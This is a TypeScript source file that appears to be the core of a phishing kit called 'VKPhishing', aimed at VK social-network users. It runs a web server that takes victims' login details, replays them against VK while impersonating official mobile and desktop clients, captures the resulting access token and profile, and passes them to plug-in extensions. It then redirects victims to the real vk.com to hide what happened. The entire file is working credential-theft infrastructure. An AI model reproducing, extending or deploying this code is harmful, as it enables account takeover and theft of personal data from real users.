import { EventEmitter } from 'events'

import Koa from 'koa'
import Router from '@koa/router'
import bodyParser from 'koa-bodyparser'

import { VK } from 'vk-io'

import userbot from './userbot'
import applyMeta from './extensions/_'

import * as appCredentials from './app-credentials'
import * as authConstants from './auth-constants'
import * as builtinExtensions from './extensions'
import * as renderers from './renderers'

import config from '../nuxt.config'

const { host, port } = config.server

export type ExtensionFunction = (
  instance: VKPhishing
) => VKPhishing | Promise<VKPhishing>

export type ExtensionMeta = {
  name: string
  description: string
}

export type Extension = ExtensionFunction & { __meta__: ExtensionMeta }

export default class VKPhishing extends EventEmitter {
  public wayOut = 'https://vk.com'
  public whenReady: Promise<void>

  constructor(public extensions: Extension[] = []) {
    super()

    this.whenReady = (async () => {
      for (const e of extensions) {
        this.extend(e)
      }
    })()
  }

  async extend(e: Extension) {
    const delta = await e(this)

    Object.assign(this, delta)

    return this
  }

  async auth(ctx: Koa.Context) {
    this.emit('before:auth-attempt', { ...ctx.request.body, ctx })

    let agent: keyof typeof appCredentials = 'android'

    const ua = String(ctx.headers['user-agent']).toLocaleLowerCase() || ''

    if (ua.includes('iphone')) agent = 'iphone'
    else if (ua.includes('ipad')) agent = 'ipad'
    else if (ua.includes('android')) agent = 'android'
    else if (ua.includes('windows phone')) agent = 'windowsPhone'
    else if (ua.includes('windows')) agent = 'windows'
    else agent = 'android'

    const json = await userbot(ctx.request.body, agent)
    this.emit('auth-attempt', {
      attempt: ctx.request.body,
      response: json,
      ctx
    })

    ctx.body = json
    this.emit('after:auth-attempt', {
      attempt: ctx.request.body,
      response: json
    })
  }

  async done(ctx: Koa.Context) {
    this.emit('before:successful-auth', { ...ctx.request.body, ctx })

    const vk = new VK({
      token: ctx.request.body.token,
      apiVersion: '5.103',
      apiHeaders: {
        'User-Agent': ctx.headers['user-agent'] || 'vkApi/1.0'
      }
    })

    const [currentUser] = await vk.api.users.get({})

    this.emit('successful-auth', {
      ...currentUser,
      ...ctx.request.body,
      ctx
    })

    ctx.body = 'ok'
    this.emit('after:successful-auth', {
      ...currentUser,
      ...ctx.request.body
    })
  }

  async exit(ctx: Koa.Context) {
    this.emit('before:user-leave', { wayOut: this.wayOut, ctx })
    ctx.redirect(this.wayOut)
    this.emit('after:user-leave', this.wayOut)
  }
}

async function bootstrap(
  instance = new VKPhishing(),
  getRenderer: renderers.RendererGetter = renderers.static
) {
  await instance.whenReady

  const renderer = await getRenderer()

  instance.emit('before:start', { port, host, renderer })

  const app = new Koa()
  const router = new Router()

  app.use(bodyParser())

  app.use(router.routes())
  app.use(router.allowedMethods())
  app.use(renderer)

  router.post('/auth', (context) => instance.auth(context))
  router.post('/done', (context) => instance.done(context))

  router.get('/exit', (context) => instance.exit(context))

  app.listen(port, host, () => instance.emit('start', { port, host }))

  instance.emit('after:start', { port, host })
}

export {
  bootstrap,
  renderers,
  authConstants,
  applyMeta,
  builtinExtensions,
  VKPhishing
}
